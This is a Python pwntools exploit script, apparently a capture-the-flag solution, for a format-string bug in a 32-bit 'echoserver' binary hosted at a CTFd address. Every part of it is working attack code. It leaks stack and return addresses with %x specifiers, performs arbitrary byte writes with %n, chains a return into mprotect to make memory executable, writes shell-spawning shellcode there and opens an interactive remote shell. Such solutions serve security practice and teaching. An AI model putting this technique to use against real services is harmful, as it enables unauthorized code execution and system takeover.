from pwn import *
context.binary = "./echoserver"

# r = process("./echoserver")
r = remote("challenges.ctfd.io", 30095)

def str_to_int(s):
    n = 0
    for c in s:
        n *= 256
        n += c
    return n

def send(s):
    r.recvline()
    r.sendline(s)
    return r.recvline()

# leak stack addr
s = int(send("%148$x").decode().strip(), 16)
esp = s - 682

# leak return address
ret = int(send("%264$x").decode().strip(), 16) - 4

# expand buffer
send(b"abcd" + p32(esp + 1053) + b"%6$n")

def write(loc, what):
    while what > 0:
        next_byte = what & 0xff
        # print(hex(loc), hex(next_byte))

        if next_byte < 4:
            send(b"A" * next_byte + b"%7$n" + b"A" * (4 - next_byte) + p32(loc) + b"\n")
        else:
            send(p32(loc) + b"A" * (next_byte - 4) + b"%5$n\n")

        loc += 1
        what >>= 8

# fix corrupted return address
write(esp + 4 * 264, ret + 4)

# call mprotect on return, then go back to main
write(ret, context.binary.symbols['mprotect'])
write(ret + 4, context.binary.symbols['main'])
write(ret + 8, 0x8048000)
write(ret + 12, 0x1000)
write(ret + 16, 7)

# get out
write(esp + 0xd4c4 - 0xd0b0, 1)

esp += 16

# leak return address
ret = u32(send("%264$x")[:4])
print(ret)

# expand buffer
send(b"abcd" + p32(esp + 1053) + b"%6$n")

# fix corrupted return address
write(esp + 4 * 264, ret + 4)

# write shellcode
write(0x8048020, str_to_int(reversed(asm(shellcraft.sh()))))
# jump to shellcode
write(ret, 0x8048020)

# get out
write(esp + 0xd4c4 - 0xd0b0, 1)

r.interactive()
